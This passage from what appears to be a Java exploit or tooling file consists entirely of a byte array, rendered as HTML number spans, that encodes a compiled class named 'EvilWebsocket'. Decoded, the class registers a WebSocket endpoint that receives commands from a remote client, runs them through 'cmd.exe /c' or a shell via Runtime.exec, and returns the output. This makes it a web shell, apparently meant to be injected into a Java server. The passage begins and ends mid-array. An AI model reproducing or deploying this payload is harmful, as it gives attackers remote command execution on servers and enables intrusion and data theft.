class="number">2</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">121</span>, <span class="number">0</span>, <span class="number">122</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>, <span class="number">124</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">125</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">0</span>, <span class="number">127</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">127</span>, <span class="number">0</span>, -<span class="number">126</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">125</span>, <span class="number">0</span>, -<span class="number">124</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">123</span>, <span class="number">0</span>, <span class="number">117</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">122</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">121</span>, <span class="number">0</span>, -<span class="number">119</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">117</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">115</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">114</span>, <span class="number">0</span>, -<span class="number">113</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">36</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">67</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">68</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">78</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">59</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">84</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">4</span>, <span class="number">61</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">78</span>, <span class="number">45</span>, -<span class="number">58</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">45</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">28</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, <span class="number">58</span>, <span class="number">4</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">13</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">58</span>, <span class="number">5</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">17</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">6</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">19</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">20</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">58</span>, <span class="number">7</span>, <span class="number">42</span>, -<span class="number">76</span>, <span class="number">0</span>, <span class="number">22</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">77</span>, <span class="number">44</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">26</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">0</span>, -<span class="number">117</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, -<span class="number">117</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, -<span class="number">112</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">122</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, 